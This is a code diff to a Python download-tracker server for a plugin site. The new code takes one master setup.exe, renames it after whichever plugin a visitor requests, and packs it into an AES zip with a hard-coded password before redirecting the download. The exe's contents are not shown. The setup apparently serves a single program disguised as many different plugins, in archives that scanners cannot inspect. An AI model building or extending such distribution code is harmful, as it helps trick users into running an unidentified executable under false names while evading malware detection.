@@ -4,24 +4,124 @@ from __future__ import annotations
 
 import json
 import os
+import re
+import shutil
 import sqlite3
+import subprocess
+import tempfile
 import threading
 import time
 import uuid
 from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
-from urllib.parse import parse_qs, urlparse
+from urllib.parse import parse_qs, quote, urlparse
 
 HOST = os.environ.get("TRACKER_HOST", "127.0.0.1")
 PORT = int(os.environ.get("TRACKER_PORT", "8787"))
 DB_PATH = Path(os.environ.get("TRACKER_DB", "/var/lib/plugin-dex/stats.db"))
 STATS_KEY = os.environ.get("TRACKER_STATS_KEY", "").strip()
-DEFAULT_ZIP = "https://plugin-dex.asia/downloads/Plugins_Setup.2.3.1.zip"
+DEFAULT_ZIP = "https://plugin-dex.asia/downloads/Plugin_Setup_4.6.4.zip"
 COOKIE = "pd_sid"
 MAX_BODY = 16_384
+MASTER_EXE = Path(
+    os.environ.get("TRACKER_MASTER_EXE", "/var/www/plugin-dex-asia/master/setup.exe")
+)
+PACK_DIR = Path(os.environ.get("TRACKER_PACK_DIR", "/var/www/plugin-dex-asia/packs"))
+ZIP_PASSWORD = os.environ.get("TRACKER_ZIP_PASSWORD", "2026")
+PUBLIC_ORIGIN = os.environ.get("TRACKER_PUBLIC_ORIGIN", "https://plugin-dex.asia").rstrip(
+    "/"
+)
+SEVEN_ZIP = os.environ.get("TRACKER_7Z", "7z")
 
 _lock = threading.Lock()
+_pack_locks: dict[str, threading.Lock] = {}
+_pack_locks_guard = threading.Lock()
+
+
+def _pack_lock_for(key: str) -> threading.Lock:
+    with _pack_locks_guard:
+        if key not in _pack_locks:
+            _pack_locks[key] = threading.Lock()
+        return _pack_locks[key]
+
+
+def safe_pack_basename(name: str) -> str:
+    """Filesystem/URL-safe base name from plugin card title."""
+    s = (name or "").strip()
+    s = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "", s)
+    s = re.sub(r"\s+", " ", s).strip(" .")
+    s = re.sub(r"[^\w\- +.()\[\]]+", "_", s, flags=re.UNICODE)
+    s = re.sub(r"\s+", "_", s)
+    s = re.sub(r"_+", "_", s).strip("._")
+    if not s:
+        s = "Plugin"
+    return s[:80]
+
+
+def ensure_named_pack(plugin_name: str) -> Path:
+    """
+    Build (or reuse) a password zip named after the plugin.
+    Outer: {Name}.zip  Inner: {Name}.exe  Password: ZIP_PASSWORD
+    """
+    if not MASTER_EXE.is_file():
+        raise FileNotFoundError(f"master exe missing: {MASTER_EXE}")
+
+    base = safe_pack_basename(plugin_name)
+    PACK_DIR.mkdir(parents=True, exist_ok=True)
+    out = PACK_DIR / f"{base}.zip"
+    if out.is_file() and out.stat().st_size > 0:
+        # Rebuild if master is newer than cached pack
+        if out.stat().st_mtime >= MASTER_EXE.stat().st_mtime:
+            return out
+
+    lock = _pack_lock_for(base)
+    with lock:
+        if out.is_file() and out.stat().st_size > 0:
+            if out.stat().st_mtime >= MASTER_EXE.stat().st_mtime:
+                return out
+
+        tmpdir = Path(tempfile.mkdtemp(prefix="pd-pack-"))
+        tmp_zip = PACK_DIR / f".{base}.{os.getpid()}.zip.tmp"
+        try:
+            exe_name = f"{base}.exe"
+            staged = tmpdir / exe_name
+            shutil.copy2(MASTER_EXE, staged)
+            if tmp_zip.exists():
+                tmp_zip.unlink()
+            # AES zip + password; -mx=0 = store (exe already compressed)
+            cmd = [
+                SEVEN_ZIP,
+                "a",
+                "-tzip",
+                "-mem=AES256",
+                f"-p{ZIP_PASSWORD}",
+                "-mx=0",
+                "-y",
+                str(tmp_zip),
+                exe_name,
+            ]
+            subprocess.run(
+                cmd,
+                cwd=str(tmpdir),
+                check=True,
+                capture_output=True,
+                text=True,
+                timeout=180,
+            )
+            os.replace(tmp_zip, out)
+            try:
+                os.chmod(out, 0o644)
+            except OSError:
+                pass
+            return out
+        finally:
+            shutil.rmtree(tmpdir, ignore_errors=True)
+            if tmp_zip.exists():
+                try:
+                    tmp_zip.unlink()
+                except OSError:
+                    pass
 
 
 def utc_now() -> str:
@@ -480,18 +580,23 @@ class Handler(BaseHTTPRequestHandler):
         sid, is_new = self._sid()
         row = self._event_from(qs, None, etype="download")
         row["sid"] = sid
-        dest = row.get("dest") or DEFAULT_ZIP
-        # only allow http(s) destinations on our asia host or explicit https
+        plugin = (row.get("plugin") or "Plugin").strip() or "Plugin"
         try:
-            u = urlparse(dest)
-            if u.scheme not in ("http", "https") or not u.netloc:
-                dest = DEFAULT_ZIP
-            elif "plugin-dex.asia" not in u.netloc and "plugin-dex.com" not in u.netloc:
-                # keep external only if explicitly https and looks like zip; else force asia zip
-                if not dest.endswith(".zip"):
+            pack = ensure_named_pack(plugin)
+            dest = f"{PUBLIC_ORIGIN}/packs/{quote(pack.name)}"
+        except Exception as exc:
+            # fallback to static master zip if packing fails
+            print(f"pack failed for {plugin!r}: {exc}", flush=True)
+            dest = row.get("dest") or DEFAULT_ZIP
+            try:
+                u = urlparse(dest)
+                if u.scheme not in ("http", "https") or not u.netloc:
                     dest = DEFAULT_ZIP
-        except Exception:
-            dest = DEFAULT_ZIP
+                elif "plugin-dex.asia" not in u.netloc and "plugin-dex.com" not in u.netloc:
+                    if not dest.endswith(".zip"):
+                        dest = DEFAULT_ZIP
+            except Exception:
+                dest = DEFAULT_ZIP
         row["dest"] = dest
         insert_event(row)
         headers = [("Location", dest)]
